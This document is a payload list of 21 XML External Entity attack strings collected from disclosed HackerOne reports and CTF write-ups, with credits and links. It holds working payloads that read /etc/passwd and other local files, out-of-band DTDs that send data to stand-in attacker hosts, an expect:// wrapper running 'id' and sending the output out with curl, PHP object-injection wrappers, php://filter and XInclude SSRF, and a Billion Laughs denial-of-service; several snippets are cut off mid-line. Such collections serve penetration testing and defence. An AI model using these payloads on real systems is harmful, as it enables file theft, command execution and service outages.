# XML External Entities

21 payloads from disclosed reports.

## PHP object injection with XXE using expect:// to achieve command execution

### `728e460e`

```
a:3:{i:0;O:10:"ConfigFile":1:{s:10:"config_raw";s:167:"<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<payload>
    <toptext>&xxe;</toptext>
</payload>";}}
```

— [Flag WriteUp](https://hackerone.com/reports/415202) · h1-5411-CTF · [caioluders](https://hackerone.com/caioluders)

### `3d96254a`

```
O:10:"ConfigFile":1:{s:10:"config_raw";s:170:"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><root>
	<toptext>&xxe;</toptext>
	<bottomtext>xd</bottomtext>
	<template></template>
	<type>text</type>
</root>";}
```

— [H1-5411 CTF Writeup](https://hackerone.com/reports/416004) · h1-5411-CTF · [leetboi](https://hackerone.com/leetboi)


## XML External Entity (XXE) payload referencing /etc/passwd

### `0adde1f8`

```
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
```

— [Uploaded XLF files result in External Entity Execution](https://hackerone.com/reports/232614) · Weblate · [4cad](https://hackerone.com/4cad)

### `d5957146`

```
require 'sinatra'

set :bind, '0.0.0.0'

get '/robots.txt' do

  'User-agent: *
Disallow:

sitemap: /sitemap.xml
'
end

get '/sitemap.xml' do
  content_type 'application/xml'

  '<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE urlset [
<!ENTITY % dtd SYSTEM "http://target.com/exfil.dtd">
%dtd;
%param1;
%exfil;
]>
<urlset xmlns="http://evil.com/schemas/sitemap/0.9" 
    xmlns:xsi="http://evil2.com/2001/XMLSchema-instance"
    xsi:schemaLocation="http://evil.com/schemas/sitem
```

— [XXE in Enterprise Search's App Search web crawler](https://hackerone.com/reports/1156748) · Elastic · [dee-see](https://hackerone.com/dee-see)


## XXE payload with external entity referencing remote URL

### `159d89ea`

```
<?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "http://target.com/text.txt" >]>
<urlset xmlns="http://evil.com/schemas/sitemap/0.9" 
   xmlns:xsi="http://evil2.com/2001/XMLSchema-instance"
   xsi:schemaLocation="http://evil.com/schemas/sitemap/0.9 http://evil.com/schemas/sitemap/0.9/sitemap.xsd">
    <url>
        <loc>&xxe;</loc>
        <lastmod>2006-11-18</lastmod>
        <changefreq>daily</changefreq>
   
```

— [XXE in Site Audit function exposing file and directory contents](https://hackerone.com/reports/312543) · Semrush · [ajxchapman](https://hackerone.com/ajxchapman)

### `ef93db37`

```
class ConfigFile {
    ...
}

$test = new ConfigFile("asdf");
$test->config_raw = '<?xml version="1.0" ?><!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY % sp SYSTEM "https://target.com/ev.xml">%sp;%param1;]><r>&exfil;</r>';

echo base64_encode(serialize($test));
```

— [H1-5411 CTF Write-up by erbbysam and ziot](https://hackerone.com/reports/415137) · h1-5411-CTF · [ziot](https://hackerone.com/ziot)


## XXE attack using entity expansion (Billion Laughs) in XML payload

### `0525c306`

```
<?xml version="1.0"?>
<!DOCTYPE lolz [
        <!ENTITY lol "lol">
        <!ELEMENT lolz (#PCDATA)>
        <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
        <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
        <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
        <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
        <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;
```

— [c3p0 may be exploited by a Billion Laughs Attack when loading XML configuration](https://hackerone.com/reports/509315) · Central Security Project · [amassey](https://hackerone.com/amassey)


## XXE command execution via expect:// wrapper exfiltrating output with curl

### `c8656600`

```
expect://curl http://target.com/r/w8rpj9w8?a=$(id)
```

— [Flag WriteUp](https://hackerone.com/reports/415202) · h1-5411-CTF · [caioluders](https://hackerone.com/caioluders)


## XXE DTD payload defining entity xxe

### `a8683061`

```
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY xxe "%goodies;">
```

— [XXE in Site Audit function exposing file and directory contents](https://hackerone.com/reports/312543) · Semrush · [ajxchapman](https://hackerone.com/ajxchapman)


## XXE via external entity definition in XML document

### `9b94ac19`

```
<!DOCTYPE svg [
<!ENTITY % outside SYSTEM "http://attacker.com/exfil.dtd">
%outside;
]>
<svg>
  <defs>
    <pattern id="exploit">
      <text x="10" y="10">
        &exfil;
      </text>
    </pattern>
  </defs>
</svg>
```

— [LFI and SSRF via XXE in emblem editor](https://hackerone.com/reports/347139) · Rockstar Games · [alexbirsan](https://hackerone.com/alexbirsan) · $1,500.0


## XXE via external entity reference in XML payload

### `d85126ae`

```
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://attacker_host/Blind_xxe"> %ext;
]>
<r></r>
```

— [Partial bypass of #483774 with Blind XXE on https://target.com](https://hackerone.com/reports/486732) · DuckDuckGo · [mik317](https://hackerone.com/mik317)


## XXE file read of /etc/passwd via external entity

### `31c5dcd8`

```
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><root>
	<toptext>&xxe;</toptext>
	<bottomtext>xd</bottomtext>
	<template></template>
	<type>text</type>
</root>
```

— [H1-5411 CTF Writeup](https://hackerone.com/reports/416004) · h1-5411-CTF · [leetboi](https://hackerone.com/leetboi)


## XXE injection using an external entity to read /etc/passwd in the XML body

### `da8221dd`

```
POST /ca/rest/certrequests HTTP/1.1
Host: ██████
Sec-Ch-Ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origi
```

**Parameter:** `ProfileID`
— [XML External Entity (XXE) Injection](https://hackerone.com/reports/2573567) · U.S. Dept Of Defense · [maskedpersian](https://hackerone.com/maskedpersian)


## XXE local‑file read via an external entity pointing to file:///etc/passwd

### `2cba250d`

```
class ConfigFile {
    ...
}

$test = new ConfigFile("asdf");
$test->config_raw = '<?xml version="1.0"?><!DOCTYPE root[<!ENTITY foo SYSTEM "file:///etc/passwd">]><test><toptext>dddrrr &foo;</toptext></test>';

echo base64_encode(serialize(array($test)));
```

— [H1-5411 CTF Write-up by erbbysam and ziot](https://hackerone.com/reports/415137) · h1-5411-CTF · [ziot](https://hackerone.com/ziot)


## XXE payload using parameter entity to read /etc/hostname

### `870f5403`

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE urlset [
 <!ENTITY % goodies SYSTEM "file:///etc/hostname">
 <!ENTITY % dtd SYSTEM "http://target.com/files/combine.dtd">
%dtd;
]>
<urlset xmlns="http://evil.com/schemas/sitemap/0.9" 
   xmlns:xsi="http://evil2.com/2001/XMLSchema-instance"
   xsi:schemaLocation="http://evil.com/schemas/sitemap/0.9 http://evil.com/schemas/sitemap/0.9/sitemap.xsd">
    <url>
        <loc>http://evil3.com/resp/&xxe;</loc>
    
```

— [XXE in Site Audit function exposing file and directory contents](https://hackerone.com/reports/312543) · Semrush · [ajxchapman](https://hackerone.com/ajxchapman)


## XXE payload reading file:///home/

### `1c861293`

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE urlset [
 <!ENTITY % goodies SYSTEM "file:///home/">
 <!ENTITY % dtd SYSTEM "http://target.com/files/combine.dtd">
%dtd;
]>
<urlset xmlns="http://evil.com/schemas/sitemap/0.9" 
   xmlns:xsi="http://evil2.com/2001/XMLSchema-instance"
   xsi:schemaLocation="http://evil.com/schemas/sitemap/0.9 http://evil.com/schemas/sitemap/0.9/sitemap.xsd">
    <url>
        <loc>http://evil3.com/resp/&xxe;</loc>
        <la
```

— [XXE in Site Audit function exposing file and directory contents](https://hackerone.com/reports/312543) · Semrush · [ajxchapman](https://hackerone.com/ajxchapman)


## XXE using php://filter to base64‑encode and retrieve a remote resource

### `e28bac1e`

```
<?xml version="1.0"?>
<!DOCTYPE root
[
<!ENTITY foo SYSTEM "php://filter/convert.base64-encode/resource=http://localhost:1337/">
]><test><toptext> &foo;</toptext></test>
```

— [H1-5411 CTF Write-up by erbbysam and ziot](https://hackerone.com/reports/415137) · h1-5411-CTF · [ziot](https://hackerone.com/ziot)


## XXE with php://filter to fetch remote content and base64‑encode it (SSRF)

### `d24b7a57`

```
a:3:{i:0;O:10:"ConfigFile":1:{s:10:"config_raw";s:222:"<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://target.com" >]>
<payload>
    <toptext>&xxe;</toptext>
</payload>";}}
```

— [Flag WriteUp](https://hackerone.com/reports/415202) · h1-5411-CTF · [caioluders](https://hackerone.com/caioluders)


## XXE using php://filter to read remote resource and base64‑encode it

### `74662da7`

```
php://filter/read=convert.base64-encode/resource=http://target.com
```

— [Flag WriteUp](https://hackerone.com/reports/415202) · h1-5411-CTF · [caioluders](https://hackerone.com/caioluders)


## XXE SSRF using external entity referencing a remote HTTP URL

### `35c1123c`

```
a:3:{i:0;O:10:"ConfigFile":1:{s:10:"config_raw";s:174:"<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://target.com" >]>
<payload>
    <toptext>&xxe;</topttext>
</payload>";}}
```

— [Flag WriteUp](https://hackerone.com/reports/415202) · h1-5411-CTF · [caioluders](https://hackerone.com/caioluders)


## XXE using XInclude to fetch external resource

### `3c76be40`

```
<text x="10" y="10">
    <xi:include href="https://target.com/" parse="text"/>
</text>
```

— [LFI and SSRF via XXE in emblem editor](https://hackerone.com/reports/347139) · Rockstar Games · [alexbirsan](https://hackerone.com/alexbirsan) · $1,500.0
